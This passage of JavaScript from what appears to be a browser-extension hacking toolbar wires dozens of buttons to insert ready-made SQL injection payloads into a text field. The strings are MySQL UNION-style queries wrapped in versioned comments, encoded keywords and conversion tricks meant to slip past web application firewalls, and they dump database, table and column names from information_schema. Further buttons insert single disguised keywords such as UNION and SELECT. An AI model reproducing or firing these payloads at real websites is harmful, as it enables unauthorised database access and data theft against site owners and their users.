 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#clmssm3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*/+/*!5000FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=HEX_TABLE_NAME';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#clmssm4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*/+/*!5000FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/ like HEX_TABLE_NAME';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#clmssm5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(SELECT+/*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*/+/*!5000FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/='TABLE_NAME_HERE'";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdbd1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e) USING utf8)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdbd2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e) USING latin1)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdbd3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000cast(GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdbd4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000unhex(hex(GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdbd5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000uncompress(compress(GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdt1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) USING utf8)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdt2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) USING latin1)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdt3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000cast(GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdt4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000unhex(hex(GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdt5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000uncompress(compress(GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdc1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) USING utf8)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME_HERE)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdc2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000CONVERT(GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) USING latin1)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME_HERE)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdc3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000cast(GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME_HERE)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdc4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000unhex(hex(GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME_HERE)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#csgdc5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000uncompress(compress(GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)))*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME_HERE)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000ORDER*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000BY*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000UNION*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000SELECT*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000GROUP_CONCAT*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf6').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000FROM*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf7').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000WHERE*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf8').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000INFORMATION_SCHEMA*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf9').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000CONCAT*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#bscwf10').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!50000ALL*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	

});


